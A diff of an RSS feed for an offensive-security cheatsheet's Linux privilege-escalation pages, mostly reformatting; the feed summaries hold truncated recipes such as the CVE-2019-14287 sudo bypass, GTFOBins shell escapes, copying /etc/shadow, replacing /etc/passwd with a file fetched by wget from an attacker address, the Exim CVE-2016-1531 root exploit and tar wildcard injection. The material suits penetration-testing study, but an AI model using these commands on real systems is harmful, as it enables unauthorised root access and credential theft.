@@ -1,23 +1,18 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Privilege Escalation on Offensive Security Cheatsheet</title>
     <link>/linux-systems/privilege-escalation/</link>
     <description>Recent content in Privilege Escalation on Offensive Security Cheatsheet</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    
-	<atom:link href="/linux-systems/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <language>en-us</language><atom:link href="/linux-systems/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>System Tricks</title>
       <link>/linux-systems/privilege-escalation/system_tricks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/privilege-escalation/system_tricks/</guid>
-      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://marc.info/?l=full-disclosure&amp;amp;m=128776663124692&amp;amp;w=2# Search for a binary privesc python3 gtfo -b systemctl 
-Recon and Enumeration # Look for strange process ps aux # Look for setuid programs (everyone can run them as root) find / -perm -4000 # Example, if perl perl -e ‘$ENV{PATH}=&amp;#34;/usr/bin&amp;#34;;system(&amp;#34;whoami&amp;#34;);’ → root # List processes running as root, permissions and NFS exports echo &amp;#39;services running as root&amp;#39;; ps aux | grep root; echo &amp;#39;permissions&amp;#39;; ps aux | awk &amp;#39;{print $11}&amp;#39;|xargs -r ls -la 2&amp;gt;/dev/null |awk &amp;#39;!</description>
+      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://marc.info/?l=full-disclosure&amp;amp;m=128776663124692&amp;amp;w=2 # Search for a binary privesc python3 gtfo -b systemctl Recon and Enumeration # Look for strange process ps aux # Look for setuid programs (everyone can run them as root) find / -perm -4000 # Example, if perl perl -e ‘$ENV{PATH}=&amp;#34;/usr/bin&amp;#34;;system(&amp;#34;whoami&amp;#34;);’ → root # List processes running as root, permissions and NFS exports echo &amp;#39;services running as root&amp;#39;; ps aux | grep root; echo &amp;#39;permissions&amp;#39;; ps aux | awk &amp;#39;{print $11}&amp;#39;|xargs -r ls -la 2&amp;gt;/dev/null |awk &amp;#39;!</description>
     </item>
     
     <item>
@@ -26,9 +21,7 @@ Recon and Enumeration # Look for strange process ps aux # Look for setuid progra
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/privilege-escalation/abusing_sudo_rights/</guid>
-      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://gtfobins.github.io/ 
-CVE 2019-14287 # Exploitable when a user have the following permissions (sudo -l) (ALL, !root) ALL # If you have a full TTY, you can exploit it like this sudo -u#-1 /bin/bash # If no TTY, you can restart SSH server and add your key sudo /etc/init.d/ssh restart echo &amp;#39;ssh-rsa AAAA[...snip...]fd48as= root@kali-jms&amp;#39; &amp;gt; authorized_keys sudo -u#-1 bash 
-Exploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /etc/shadow # You will get an error and it will # display first line   apt-get sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh    awk sudo awk &amp;lsquo;BEGIN {system(&amp;ldquo;/bin/sh&amp;rdquo;)}&amp;rsquo;    ed sudo /usr/bin/ed !</description>
+      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://gtfobins.github.io/ CVE 2019-14287 # Exploitable when a user have the following permissions (sudo -l) (ALL, !root) ALL # If you have a full TTY, you can exploit it like this sudo -u#-1 /bin/bash # If no TTY, you can restart SSH server and add your key sudo /etc/init.d/ssh restart echo &amp;#39;ssh-rsa AAAA[...snip...]fd48as= root@kali-jms&amp;#39; &amp;gt; authorized_keys sudo -u#-1 bash Exploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /etc/shadow # You will get an error and it will # display first line   apt-get sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh    awk sudo awk &amp;lsquo;BEGIN {system(&amp;quot;/bin/sh&amp;quot;)}&amp;rsquo;    ed sudo /usr/bin/ed !</description>
     </item>
     
     <item>
@@ -37,9 +30,7 @@ Exploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /et
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/privilege-escalation/suid/</guid>
-      <description>/usr/bin/cp # cp -- Il cp is SUID, you can copy privilegied files to /tmp and read them cp /etc/shadow /tmp # generate new account openssl passwd -1 -salt username password # Then create a fake /etc/passwd file, upload it to the target and cp wget http://192.168.1.111:8000/passwd cp passwd /etc/passwd 
-/usr/bin/doas # doas cat /etc/doas.conf doas /usr/bin/less /var/log/authlog # Press v to escape vi then :!sh 
-/usr/bin/find # find touch raj find raj -exec &amp;#34;whoami&amp;#34; \; find raj -exec &amp;#34;/bin/sh&amp;#34; \; # another method find /home –exec chmod u+s /usr/bin/wget \; ls –la /usr/bin/wget cat /etc/passwd # then create another etc/passwd file and upload it</description>
+      <description>/usr/bin/cp # cp -- Il cp is SUID, you can copy privilegied files to /tmp and read them cp /etc/shadow /tmp # generate new account openssl passwd -1 -salt username password # Then create a fake /etc/passwd file, upload it to the target and cp wget http://192.168.1.111:8000/passwd cp passwd /etc/passwd /usr/bin/doas # doas cat /etc/doas.conf doas /usr/bin/less /var/log/authlog # Press v to escape vi then :!sh /usr/bin/find # find touch raj find raj -exec &amp;#34;whoami&amp;#34; \; find raj -exec &amp;#34;/bin/sh&amp;#34; \; # another method find /home –exec chmod u+s /usr/bin/wget \; ls –la /usr/bin/wget cat /etc/passwd # then create another etc/passwd file and upload it /usr/bin/micro # micro editor cat /etc/passwd | /usr/bin/micro # Then generate another user openssl passwd -1 -salt user3 pass123 /usr/bin/mawk # mawk mawk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&amp;#39; </description>
     </item>
     
     <item>
@@ -48,9 +39,7 @@ Exploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /et
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/privilege-escalation/services/</guid>
-      <description>Table of Content  Exim4 MySQL Docker Redis LXD  
-Exim4 # https://www.exploit-db.com/exploits/39535 #!/bin/sh echo [ CVE-2016-1531 local root exploit cat &amp;gt; /tmp/root.pm &amp;lt;&amp;lt; EOF package root; use strict; use warnings; system(&amp;#34;/bin/sh&amp;#34;); EOF PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -pswget http://192.168.0.8:8000/raptor_exim_wiz.sh chmod 777 raptor_exim_wiz.sh ./raptor_exim_wiz.sh -m netcat nc -lvvp 4444 
-MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;usermod -a -G admin username&amp;#39;) Select sys_exec(&amp;#39;whoami&amp;#39;); select sys_exec(&amp;#39;/bin/bash&amp;#39;); Select sys_eval(&amp;#39;whoami&amp;#39;); # MySQL run as root and version is &amp;lt;5 go for User Defined Functions (UDF) https://www.</description>
+      <description>Table of Content  Exim4 MySQL Docker Redis LXD  Exim4 # https://www.exploit-db.com/exploits/39535 #!/bin/sh echo [ CVE-2016-1531 local root exploit cat &amp;gt; /tmp/root.pm &amp;lt;&amp;lt; EOF package root; use strict; use warnings; system(&amp;#34;/bin/sh&amp;#34;); EOF PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps wget http://192.168.0.8:8000/raptor_exim_wiz.sh chmod 777 raptor_exim_wiz.sh ./raptor_exim_wiz.sh -m netcat nc -lvvp 4444 MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;usermod -a -G admin username&amp;#39;) Select sys_exec(&amp;#39;whoami&amp;#39;); select sys_exec(&amp;#39;/bin/bash&amp;#39;); Select sys_eval(&amp;#39;whoami&amp;#39;); # MySQL run as root and version is &amp;lt;5 go for User Defined Functions (UDF) https://www.</description>
     </item>
     
     <item>
@@ -59,8 +48,7 @@ MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;user
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/privilege-escalation/crontab/</guid>
-      <description>Tar wildcard + root cron # If a privilegied script is used to backup something or just uses tar * in a folder you have write access # You can exploit it to gain root access # Create 3 files in the folder touch -- &amp;#34;--checkpoint=1&amp;#34; touch -- “--checkpoint-action=exec=sh\ shell.sh” touch shell.sh # Then put your payload in the shell.sh script (#!/bin/sh) cat /etc/shadow &amp;gt; outfile.txt 
-Exploiting crontab # If a script is running with higher privileges echo &amp;#34;cat /challenge/app-script/ch4/.</description>
+      <description>Tar wildcard + root cron # If a privilegied script is used to backup something or just uses tar * in a folder you have write access # You can exploit it to gain root access # Create 3 files in the folder touch -- &amp;#34;--checkpoint=1&amp;#34; touch -- “--checkpoint-action=exec=sh\ shell.sh” touch shell.sh # Then put your payload in the shell.sh script (#!/bin/sh) cat /etc/shadow &amp;gt; outfile.txt Exploiting crontab # If a script is running with higher privileges echo &amp;#34;cat /challenge/app-script/ch4/.</description>
     </item>
     
   </channel>
